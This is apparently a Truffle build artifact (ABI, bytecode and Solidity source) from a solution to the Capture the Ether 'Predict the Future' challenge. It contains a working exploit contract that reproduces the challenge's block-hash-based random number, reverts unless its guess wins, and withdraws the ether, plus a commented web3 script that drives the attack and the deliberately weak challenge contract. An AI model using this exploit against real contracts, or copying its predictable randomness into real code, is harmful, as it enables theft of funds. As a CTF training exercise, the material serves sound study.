{
  "contractName": "PredictHelper",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "getOtherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddr",
          "type": "address"
        }
      ],
      "name": "setOtherContract",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "waste",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "otherContract",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "calculatedAnswer",
          "type": "uint8"
        },
        {
          "indexed": false,
          "name": "lockedInGuess",
          "type": "uint8"
        }
      ],
      "name": "SettleAttempt",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "caller",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "SetOtherContract",
      "type": "event"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getGuess",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getSettlementBlockNumber",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getAnswer",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "wasteBlock",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "isComplete",
      "outputs": [
        {
          "name": "",
          "type": "bool"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "n",
          "type": "uint8"
        }
      ],
      "name": "lockInGuess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "settle",
      "outputs": [
        {
          "name": "calculatedAnswer",
          "type": "uint8"
        },
        {
          "name": "lockedInGuess",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x606060405260008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550341561005057600080fd5b61096a8061005f6000396000f3006060604052600436106100ba576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630b4b5198146100bc57806311da60b4146101115780631e73c0451461014d5780632c0e00541461016257806335a28f3e1461017d5780633ccfd60b146101b657806354846684146101cb57806380d4e157146101fa5780638d582ae4146102235780639c16667c14610252578063b2fa1c9e14610281578063e98d36e1146102ae575b005b34156100c757600080fd5b6100cf610303565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b341561011c57600080fd5b61012461032c565b604051808360ff1660ff1681526020018260ff1660ff1681526020019250505060405180910390f35b341561015857600080fd5b61016061052f565b005b61017b600480803560ff1690602001909190505061055f565b005b341561018857600080fd5b6101b4600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610681565b005b34156101c157600080fd5b6101c961075b565b005b34156101d657600080fd5b6101de6107b4565b604051808260ff1660ff16815260200191505060405180910390f35b341561020557600080fd5b61020d6107c7565b6040518082815260200191505060405180910390f35b341561022e57600080fd5b6102366107d1565b604051808260ff1660ff16815260200191505060405180910390f35b341561025d57600080fd5b6102656107e7565b604051808260ff1660ff16815260200191505060405180910390f35b341561028c57600080fd5b61029461082b565b604051808215151515815260200191505060405180910390f35b34156102b957600080fd5b6102c1610919565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60008060008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561037957600080fd5b6103816107e7565b9150819350600060159054906101000a900460ff1692507ff430fae7dcd743cb624233f31d0fedb35c80056c4b314826ccc719ce56ad51478484604051808360ff1660ff1681526020018260ff1660ff1681526020019250505060405180910390a16000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561046a57600080fd5b5af1151561047757600080fd5b505050600115158173ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156104e157600080fd5b5af115156104ee57600080fd5b50505060405180519050151514151561050657600080fd5b600060159054906101000a900460ff1660ff168260ff1614151561052957600080fd5b50509091565b6001600060148282829054906101000a900460ff160192506101000a81548160ff021916908360ff160217905550565b6000806000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16141515156105a757600080fd5b81600060156101000a81548160ff021916908360ff160217905550600143016001819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16632c0e0054670de0b6b3a7640000846040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff1660ff1681526020019150506000604051808303818588803b151561066c57600080fd5b5af1151561067957600080fd5b505050505050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055507f081eb3239ea805b9a08e7c4f93baacc9d1965ecde599e5ed9b2b3936cd3fe0b83382604051808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a150565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015156107b257600080fd5b565b600060149054906101000a900460ff1681565b6000600154905090565b60008060159054906101000a900460ff16905090565b6000600a6001430340426040518083600019166000191681526020018281526020019250505060405180910390206001900460ff1681151561082557fe5b06905090565b60008060008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161415151561087557600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156108fc57600080fd5b5af1151561090957600080fd5b5050506040518051905091505090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff16815600a165627a7a72305820a8e43a8dcb719dcd206be54679125b5e7d38252f9e35bc880514fc8adb994c670029",
  "source": "pragma solidity ^0.4.21;\r\n\r\nimport './OtherContract.sol';\r\n/*\r\nconst oneEth = web3.utils.toWei('1', 'ether');\r\nvar predictTheFutureChallenge = await PredictTheFutureChallenge.deployed();\r\nvar predictHelper = await PredictHelper.deployed();\r\n\r\nvar blockNumTarget = await web3.eth.getBlockNumber() + 2;\r\nawait web3.eth.getBlockNumber();\r\n(await predictHelper.getAnswer()).toNumber()\r\nawait predictHelper.lockInGuess(0, {from: accounts[0], value: oneEth});\r\nawait web3.eth.getBlockNumber();\r\nawait predictHelper.wasteBlock();\r\nawait predictHelper.settle();\r\nawait predictHelper.isComplete();\r\nawait web3.eth.getBalance(predictTheFutureChallenge.address)\r\n*/\r\n\r\n// essential reading: https://solidity-by-example.org/hacks/accessing-private-data/\r\n\r\ncontract PredictHelper is OtherContract {\r\n    uint8 public waste;\r\n    uint8 guess;\r\n    uint256 settlementBlockNumber;\r\n\r\n    function getGuess() public view returns (uint8) {\r\n        return guess;\r\n    }\r\n\r\n    function getSettlementBlockNumber() public view returns (uint256) {\r\n        return settlementBlockNumber;\r\n    }\r\n\r\n    function getAnswer() public view returns (uint8) {\r\n        return uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\r\n    }\r\n\r\n    function wasteBlock() public {\r\n        waste += 1;\r\n    }\r\n\r\n    function() public payable { \r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        require(otherContract != 0);\r\n        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);\r\n        return predictTheFutureChallenge.isComplete();\r\n    }\r\n    \r\n    function lockInGuess(uint8 n) public payable {\r\n        require(otherContract != 0);\r\n        guess = n;\r\n        settlementBlockNumber = block.number + 1;\r\n        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);\r\n        predictTheFutureChallenge.lockInGuess.value(1 ether)(n);\r\n    }\r\n\r\n    event SettleAttempt(uint8 calculatedAnswer, uint8 lockedInGuess);\r\n\r\n    function settle() public returns (uint8 calculatedAnswer, uint8 lockedInGuess) {\r\n        require(otherContract != 0);\r\n        uint8 answer = getAnswer();\r\n        calculatedAnswer = answer;\r\n        lockedInGuess = guess;\r\n        emit SettleAttempt(calculatedAnswer, lockedInGuess);\r\n\r\n        PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);\r\n        \r\n        predictTheFutureChallenge.settle();\r\n        require(predictTheFutureChallenge.isComplete() == true);\r\n        require(answer == guess);\r\n    }\r\n\r\n    function withdraw() public {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n}\r\n\r\n/*\r\n# Storage\r\n- 2 ** 256 slots\r\n- 32 bytes for each slot\r\n- data is stored sequentially in the order of declaration\r\n- storage is optimized to save space. If neighboring variables fit in a single\r\n  32 bytes, then they are packed into the same slot, starting from the right\r\n*/\r\n\r\ncontract PredictTheFutureChallenge {\r\n    address guesser;    // slot 0\r\n    uint8 guess;        // appended to slot 0\r\n    uint256 settlementBlockNumber;  // slot 1\r\n\r\n    function PredictTheFutureChallenge() public payable {\r\n        require(msg.value == 1 ether);\r\n    }\r\n\r\n    function isComplete() public view returns (bool) {\r\n        return address(this).balance == 0;\r\n    }\r\n\r\n    function lockInGuess(uint8 n) public payable {\r\n        require(guesser == 0);\r\n        require(msg.value == 1 ether);\r\n\r\n        guesser = msg.sender;\r\n        guess = n;\r\n        settlementBlockNumber = block.number + 1;\r\n    }\r\n\r\n    function settle() public {\r\n        require(msg.sender == guesser);\r\n        require(block.number > settlementBlockNumber);\r\n\r\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;\r\n\r\n        guesser = 0;\r\n        if (guess == answer) {\r\n            msg.sender.transfer(2 ether);\r\n        }\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\defi\\capturetheether\\contracts\\PredictTheFutureChallenge.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.21+commit.dfe3193c.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-11T14:32:05.060Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}